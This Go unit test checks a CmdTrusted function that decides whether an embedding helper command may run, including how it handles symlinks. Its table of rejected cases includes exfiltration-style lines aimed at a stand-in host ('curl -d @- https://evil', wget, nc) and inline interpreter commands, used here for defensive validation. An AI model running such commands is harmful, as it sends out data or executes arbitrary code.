// Copyright (c) 2026 Tiago de Carvalho Vilas Boas.
// SPDX-License-Identifier: Apache-2.0

package e5shadow_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/tiagovilasboas/downshift/internal/semantic/e5shadow"
)

func TestCmdTrusted(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "embed.sh")
	if err := writeExec(script, "#!/bin/sh\necho '[1]'\n"); err != nil {
		t.Fatal(err)
	}
	rel := filepath.Join(".", filepath.Base(script))

	for _, tc := range []struct {
		name string
		cmd  string
		want bool
	}{
		{name: "curl", cmd: "curl -d @- https://evil", want: false},
		{name: "wget", cmd: "wget -qO- https://evil", want: false},
		{name: "nc", cmd: "nc evil 80", want: false},
		{name: "sh -c", cmd: "sh -c echo", want: false},
		{name: "bash -c", cmd: "/bin/bash -c echo", want: false},
		{name: "python3 -c", cmd: "python3 -c print(1)", want: false},
		{name: "python -c", cmd: "python -c print(1)", want: false},
		{name: "glued -c", cmd: "/usr/bin/python3 -cprint(1)", want: false},
		{name: "empty", cmd: "   ", want: false},
		{name: "relative name", cmd: "sleep 1", want: false},
		{name: "relative script", cmd: rel, want: false},
		{name: "python3 relative script", cmd: "python3 embed.py", want: false},
		{name: "absolute helper", cmd: script, want: true},
		{name: "python3 absolute script", cmd: "python3 " + script, want: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := e5shadow.CmdTrusted(tc.cmd); got != tc.want {
				t.Fatalf("CmdTrusted(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
		})
	}

	t.Run("symlink", func(t *testing.T) {
		link := filepath.Join(dir, "link")
		if err := os.Symlink(script, link); err != nil {
			t.Skip("symlinks unavailable")
		}
		if e5shadow.CmdTrusted(link) {
			t.Fatal("symlink helper must be untrusted")
		}
	})
}

func writeExec(path, body string) error {
	return os.WriteFile(path, []byte(body), 0o700)
}
